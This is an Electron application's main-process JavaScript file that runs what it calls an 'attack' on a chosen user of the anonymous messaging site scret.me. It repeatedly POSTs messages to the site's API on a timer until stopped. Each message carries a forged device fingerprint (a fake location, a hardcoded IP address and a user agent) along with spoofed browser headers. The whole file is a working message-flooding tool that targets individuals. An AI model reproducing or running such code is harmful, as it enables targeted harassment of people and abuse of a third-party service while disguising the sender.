const { app, BrowserWindow, ipcMain } = require('electron');

app.on('ready', () => {
    win = new BrowserWindow({
        width: 800,
        height: 800,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
        }
    });

    win.loadFile('index.html');
    let refreshId;

    ipcMain.on('attack', async (event, url, message, delay) => {
        let user = url.split("https://scret.me/").join("");
        console.log(`Trying to send attack on user ${user}...`);

        const payload = {
            slug: user,
            content: message,
            device: JSON.stringify({
              country_code: 'US',
              country_name: 'United States',
              city: 'Washington, D.C.',
              postal: '20001',
              latitude: 38.895111,
              longitude: -77.036369,
              IPv4: '173.166.164.121',
              state: 'District Of Columbia',
              userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
            }),
            tips: []
        };
          
        refreshId = setInterval(async () => {
            try {
                const response = await fetch('https://api.scret.me/v1/message', {
                    method: 'POST',
                    headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.9,pt;q=0.8',
                    'Referer': 'https://scret.me/',
                    'Referrer-Policy': 'strict-origin-when-cross-origin',
                    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site'
                    },
                    body: JSON.stringify(payload)
                });
            
                const data = await response.json();
                if(data['isValid'] == true)
                    console.log(`Attack sent successfully on user ${user}`);
            } catch (error) {
                console.error(error);
            }
            console.log(`Sleeping for ${delay/1000} seconds...`);
        },delay);
    });
    
    ipcMain.on('stop', () => {
        console.log(`CANCELED ATTACK`);
        clearInterval(refreshId);
    });
});